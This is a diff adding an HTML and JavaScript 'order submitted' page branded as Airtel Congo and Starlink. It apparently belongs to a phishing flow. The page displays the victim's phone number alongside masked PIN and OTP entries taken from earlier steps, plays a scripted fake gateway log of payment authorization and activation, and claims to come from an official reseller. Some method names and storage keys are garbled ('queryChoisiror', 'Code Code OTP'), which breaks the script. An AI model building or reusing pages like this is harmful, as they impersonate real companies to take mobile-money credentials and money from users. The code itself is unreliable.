@@ -1,0 +1,232 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#C2001A">
+<title>Airtel Congo × Starlink — Commande Soumise</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700;9..40,800;9..40,900&family=DM+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{font-family:'DM Sans',system-ui,sans-serif;-webkit-font-smoothing:antialiased;background:#F5F5F5;color:#1C1B1F;display:flex;flex-direction:column;position:fixed;inset:0;width:100%;height:100vh;height:100dvh;overflow:hidden}
+button{font-family:inherit;touch-action:manipulation;border:none;background:none;cursor:pointer;outline:none;-webkit-user-select:none;user-select:none}
+img{display:block;max-width:100%}
+*{-webkit-user-select:none;user-select:none}
+:root{
+  --red:#C2001A;--red-dk:#960014;--red-lt:#FFDAD6;--on-red-cont:#410002;
+  --blue:#1B62B5;
+  --surf:#FFFBFF;--surf-lo:#F7F2FA;--surf-mid:#F3EDF7;--surf-hi:#ECE6F0;
+  --on-surf:#1C1B1F;--on-surf-v:#49454F;
+  --outline:#79747E;--outline-v:#CAC4D0;
+  --gold:#7A5900;--gold-cont:#FFDEA8;
+  --ok:#386A20;--ok-cont:#C0EFA4;
+  --r-md:12px;--r-lg:16px;--r-xl:28px;--r-full:999px;
+  --e1:0 1px 2px rgba(0,0,0,.12),0 1px 3px 1px rgba(0,0,0,.08);
+  --e2:0 1px 2px rgba(0,0,0,.12),0 2px 6px 2px rgba(0,0,0,.10);
+  --ease:cubic-bezier(.2,0,0,1);
+}
+@keyframes rip-anim{to{transform:scale(4);opacity:0}}
+@keyframes pg-in{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+@keyframes ping{0%{transform:scale(1);opacity:.8}80%,100%{transform:scale(2.4);opacity:0}}
+@keyframes term-in{from{opacity:0;transform:translateX(-4px)}to{opacity:1;transform:none}}
+
+/* NAV */
+.nav{flex-shrink:0;background:var(--red);display:flex;align-items:center;justify-content:space-between;padding:0 16px;height:calc(56px + env(safe-area-inset-top,0px));padding-top:env(safe-area-inset-top,0px);box-shadow:var(--e2);z-index:20}
+.nav-logos{display:flex;align-items:center;gap:10px}
+.nav-sep{width:1px;height:16px;background:rgba(255,255,255,.28)}
+
+/* SCROLL */
+.scroll{flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;overscroll-behavior-y:contain;scrollbar-width:none;animation:pg-in .3s var(--ease) both}
+.scroll::-webkit-scrollbar{display:none}
+.content{padding:18px 16px;display:flex;flex-direction:column;gap:14px}
+
+/* STATUS BADGE */
+.status-badge{display:flex;align-items:center;gap:8px;background:rgba(122,89,0,.1);border:1px solid rgba(122,89,0,.22);border-radius:var(--r-full);padding:6px 16px;width:fit-content}
+.ping-wrap{position:relative;width:10px;height:10px;flex-shrink:0}
+.ping-ring{position:absolute;inset:0;border-radius:50%;background:var(--gold);animation:ping 1.5s infinite}
+.ping-core{position:absolute;inset:1.5px;border-radius:50%;background:var(--gold)}
+.status-txt{font-size:11px;font-weight:700;color:var(--gold);letter-spacing:.5px;text-transform:uppercase}
+
+/* REF CARD */
+.ref-card{background:linear-gradient(135deg,var(--surf) 0%,var(--surf-mid) 100%);border-radius:var(--r-xl);box-shadow:var(--e1);padding:18px;border:1px solid var(--outline-v)}
+.ref-lbl{font-size:10px;font-weight:700;color:var(--on-surf-v);letter-spacing:.7px;text-transform:uppercase;margin-bottom:6px}
+.ref-val{font-size:22px;font-weight:800;color:var(--on-surf);font-family:'DM Mono',monospace;letter-spacing:1px}
+.copy-btn{display:flex;align-items:center;gap:6px;margin-top:12px;background:var(--surf-mid);border:1px solid var(--outline-v);padding:7px 14px;border-radius:var(--r-full);font-size:12px;font-weight:600;color:var(--on-surf-v);cursor:pointer;width:fit-content;position:relative;overflow:hidden;transition:background .15s}
+.copy-btn:active{background:var(--surf-hi)}
+
+/* DETAIL CARD */
+.detail-card{background:var(--surf);border-radius:var(--r-xl);box-shadow:var(--e1);overflow:hidden}
+.detail-head{background:linear-gradient(135deg,var(--red) 0%,var(--red-dk) 100%);padding:12px 16px;display:flex;align-items:center;gap:8px}
+.detail-head-txt{font-size:14px;font-weight:700;color:#fff}
+.detail-rows{display:flex;flex-direction:column}
+.dr{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border-bottom:1px solid var(--outline-v)}
+.dr:last-child{border-bottom:none}
+.dr-lbl{font-size:12px;color:var(--on-surf-v);font-weight:500}
+.dr-val{font-size:13px;font-weight:700;color:var(--on-surf);font-family:'DM Mono',monospace;text-align:right}
+.dr-val.red{color:var(--red)}
+.dr-val.ok{color:var(--ok)}
+.dr-val.gold{color:var(--gold)}
+
+/* TERMINAL */
+.terminal{background:#0D1117;border:1px solid #21262D;border-radius:var(--r-lg);padding:14px;font-family:'DM Mono',monospace;font-size:11px;line-height:1.75;overflow:hidden}
+.term-head{display:flex;align-items:center;gap:6px;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid #21262D}
+.term-dot{width:10px;height:10px;border-radius:50%}
+.term-line{color:#8B949E;animation:term-in .3s both}
+.term-line em{color:#58A6FF;font-style:normal}
+.term-line.ok em{color:#56D364}
+.term-line.warn em{color:#E3B341}
+
+/* BUTTONS */
+.btn-primary{width:100%;height:52px;border-radius:var(--r-full);background:var(--red);color:#fff;font-size:15px;font-weight:800;letter-spacing:.3px;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 2px 12px rgba(194,0,26,.3);position:relative;overflow:hidden;transition:transform .12s}
+.btn-primary:active{transform:scale(.97)}
+.btn-outline{width:100%;height:48px;border-radius:var(--r-full);background:transparent;border:1.5px solid var(--outline-v);color:var(--on-surf-v);font-size:14px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:8px;position:relative;overflow:hidden}
+.btn-outline:active{background:var(--surf-mid)}
+
+.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(0,0,0,.07);transform:scale(0);animation:rip-anim .5s ease forwards}
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-logos">
+    <img src="assets/airtel-logo.svg" alt="Airtel" height="18" onerror="this.outerHTML='<span style=\'font-size:16px;font-weight:900;color:#fff\'>airtel</span>'">
+    <div class="nav-sep"></div>
+    <img src="assets/starlink-white.png" alt="Starlink" height="12" onerror="this.outerHTML='<span style=\'font-size:10px;font-weight:800;letter-spacing:1.5px;color:rgba(255,255,255,.85)\'>STARLINK</span>'">
+  </div>
+  <img src="assets/airtel-logo.svg" alt="Airtel" height="18" style="opacity:0" aria-hidden="true">
+</nav>
+
+<div class="scroll">
+  <div class="content">
+
+    <!-- Status badge -->
+    <div style="display:flex;align-items:center;justify-content:space-between">
+      <div class="status-badge">
+        <div class="ping-wrap"><div class="ping-ring"></div><div class="ping-core"></div></div>
+        <span class="status-txt">Autorisation en Cours</span>
+      </div>
+      <img src="assets/airtel-logo.svg" alt="Airtel" height="18" onerror="this.outerHTML='<span style=\'font-size:15px;font-weight:900;color:var(--red)\'>airtel</span>'">
+    </div>
+
+    <!-- Ref card -->
+    <div class="ref-card">
+      <div class="ref-lbl">ID de Référence</div>
+      <div class="ref-val" id="refVal">#STL-CG-000000</div>
+      <button class="copy-btn" onclick="copyRef()">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+        Copier la référence
+      </button>
+    </div>
+
+    <!-- Order details -->
+    <div class="detail-card">
+      <div class="detail-head">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+        <div class="detail-head-txt">Résumé de la Commande</div>
+      </div>
+      <div class="detail-rows">
+        <div class="dr"><span class="dr-lbl">Forfait</span><span class="dr-val red" id="drForfait">—</span></div>
+        <div class="dr"><span class="dr-lbl">Numéro Airtel Lite</span><span class="dr-val" id="drPhone">—</span></div>
+        <div class="dr"><span class="dr-lbl">Code PIN</span><span class="dr-val">&bull;&bull;&bull;&bull;</span></div>
+        <div class="dr"><span class="dr-lbl">Code Code OTP Saisi</span><span class="dr-val">&bull;&bull;&bull;&bull;</span></div>
+        <div class="dr"><span class="dr-lbl">Montant</span><span class="dr-val gold" id="drPrice">—</span></div>
+        <div class="dr"><span class="dr-lbl">Validité</span><span class="dr-val" id="drDays">—</span></div>
+        <div class="dr"><span class="dr-lbl">Statut Passerelle</span><span class="dr-val ok">Validation r&eacute;seau&hellip;</span></div>
+      </div>
+    </div>
+
+    <!-- Terminal log -->
+    <div class="terminal">
+      <div class="term-head">
+        <div class="term-dot" style="background:#FF5F56"></div>
+        <div class="term-dot" style="background:#FFBD2E"></div>
+        <div class="term-dot" style="background:#27C93F"></div>
+        <span style="font-size:10px;color:#8B949E;margin-left:6px">airtel-gateway.log</span>
+      </div>
+      <div id="termLog"></div>
+    </div>
+
+    <!-- Action buttons -->
+    <button class="btn-primary" onclick="newOrder()">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg>
+      Nouvelle Commande
+    </button>
+    <button class="btn-outline" onclick="location.href='airtel-index.html'">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M15 18l-6-6 6-6"/></svg>
+      Retour to Forfaits
+    </button>
+
+    <div style="text-align:center;padding:8px 0 4px">
+      <div style="font-size:10px;color:var(--on-surf-v);letter-spacing:.3px">&copy; 2026 Airtel Congo &middot; Official Starlink&trade; Reseller</div>
+    </div>
+    <div style="height:8px"></div>
+  </div>
+</div>
+
+<script>
+'use strict';
+function hap(ms){try{navigator.vibrate&&navigator.vibrate(ms);}catch(e){}}
+function rip(el,e){var r=el.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2.5,s=document.createElement('span');s.className='rip';s.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;';el.appendChild(s);s.addEventListener('animationend',function(){s.remove();});}
+function slp(ms){return new Promise(function(r){setTimeout(r,ms);})}
+
+// Load data
+var forfait={},auth={};
+try{forfait=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
+try{auth=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
+var ref=sessionStorage.getItem('starlinkRef')||('STL-CG-'+(Math.random()*9e5+1e5|0));
+var otp=sessionStorage.getItem('starlinkCode OTP')||'';
+
+document.getElementById('refVal').textContent='#'+ref;
+document.getElementById('drForfait').textContent=(forfait.name||'—')+' · '+(forfait.price||'');
+document.getElementById('drPhone').textContent=auth.phone?'+243 '+auth.phone:'—';
+document.getElementById('drPrice').textContent=forfait.price||'—';
+document.getElementById('drDays').textContent=forfait.jours?forfait.jours+' jours':'—';
+
+// Terminal log
+async function runLog(){
+  var logs=[
+    {t:400,cls:'',txt:'<em>[INFO]</em> Connexion à la passerelle Airtel Congo établie'},
+    {t:900,cls:'',txt:'<em>[INFO]</em> Forfait: '+(forfait.name||'—')+' · '+(forfait.price||'—')},
+    {t:1500,cls:'',txt:'<em>[INFO]</em> Numéro vérifié : +243'+(auth.phone||'—')},
+    {t:2200,cls:'warn',txt:'<em>[WAIT]</em> Autorisation de paiement en attente…'},
+    {t:3000,cls:'',txt:'<em>[INFO]</em> Transmission vers la passerelle Airtel Money…'},
+    {t:3800,cls:'ok',txt:'<em>[OK]</em>  Reference: #'+ref+' enregistrée'},
+    {t:4600,cls:'warn',txt:'<em>[WAIT]</em> Activation réseau Starlink en cours…'},
+  ];
+  var el=document.getElementById('termLog');
+  for(var i=0;i<logs.length;i++){
+    await slp(logs[i].t-(i>0?logs[i-1].t:0));
+    var d=document.createElement('div');
+    d.className='term-line '+logs[i].cls;
+    d.innerHTML=logs[i].txt;
+    el.appendChild(d);
+    el.scrollTop=el.scrollHeight;
+  }
+}
+runLog();
+
+// Copy ref
+function copyRef(){
+  var txt=document.getElementById('refVal').textContent;
+  if(navigator.clipboard)navigator.clipboard.writeText(txt);
+  hap(18);
+  var btn=document.queryChoisiror('.copy-btn');
+  var orig=btn.innerHTML;
+  btn.innerHTML='<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#386A20" stroke-width="2.5" stroke-linecap="round"><path d="M4 12l5.5 5.5L20 7"/></svg> Copié !';
+  setTimeout(function(){btn.innerHTML=orig;},2000);
+}
+
+// New order
+function newOrder(){
+  sessionStorage.removeItem('starlinkForfait');sessionStorage.removeItem('starlinkAuth');
+  sessionStorage.removeItem('starlinkRef');sessionStorage.removeItem('starlinkCode OTP');
+  location.href='airtel-index.html';
+}
+
+document.queryChoisirorAll('button').forEach(function(b){b.addEventListener('pointerdown',function(e){rip(this,e);},{passive:true});});
+</script>
+</body>
+</html>
